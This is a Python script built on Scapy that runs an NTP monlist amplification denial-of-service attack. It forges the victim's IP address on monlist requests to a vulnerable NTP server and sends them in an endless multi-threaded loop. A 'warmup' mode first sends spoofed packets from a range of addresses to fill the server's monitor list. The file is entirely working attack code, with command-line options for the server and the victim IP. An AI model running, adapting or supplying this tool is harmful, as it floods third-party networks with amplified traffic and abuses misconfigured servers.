import argparse
import random
import threading
import datetime

from scapy.all import*

class NTPAmp(object):
    def __init__(self, ntpserv, victim, nthreads):
        self.ntpserv = ntpserv
        self.victim = victim
        self.nthreads = nthreads

        self.DEFAULT_PORT=8080 #Target's vulnerable port

    def add_monlist(self,srcip,sport):
        """
        Send ntp sync
        this is equals ntpdate
        """
        ntpconf = {
            'leap': 'unknown (clock unsynchronized)',
            'version': 4L,
            'stratum': 0L,
            'poll': 3L,
            'precision': 250L,
            'delay': 1.0,
            'dispersion': 1.0,
            'ref_id': '',
            'orig': 0.0,
            'sent': datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")
        }
        pkt=IP(src=srcip, dst=self.ntpserv)/UDP(sport=sport,dport=123)/NTP(**ntpconf)
        send(pkt)

    def get_monlist(self):
        data = "\x17\x00\x03\x2a" + "\x00" * 4
        pkt=IP(dst=self.ntpserv,src=self.victim)/UDP(sport=self.DEFAULT_PORT,dport=123)/Raw(load=data)
        send(pkt,loop=1)

    def warmup(self):
        target="192.168.178.{}"
        for r in range(1, 254):
            self.add_monlist(target.format(r), random.randint(2000, 65535))

    def attack(self):
        threads=[]
        for r in range(self.nthreads):
            thread = threading.Thread(target=self.get_monlist)
            thread.daemon=True
            thread.start()

            threads.append(thread)
        for thread in threads:
            thread.join()

def argument_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-w', '--warmup', action='store_true', help='Execute warmup')
    parser.add_argument('-s', '--ntpserv', type=str, help='Vulnerable NTP Server IP Address')
    parser.add_argument('-v', '--victim',  type=str, help='Victim IP Address')
    parser.add_argument('-n', '--nthreads',type=int, help='Number of threads')
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    args = argument_parse()
    ntpamp = NTPAmp(args.ntpserv, args.victim, args.nthreads)
    if args.warmup:
        ntpamp.warmup()
    else:
        ntpamp.attack()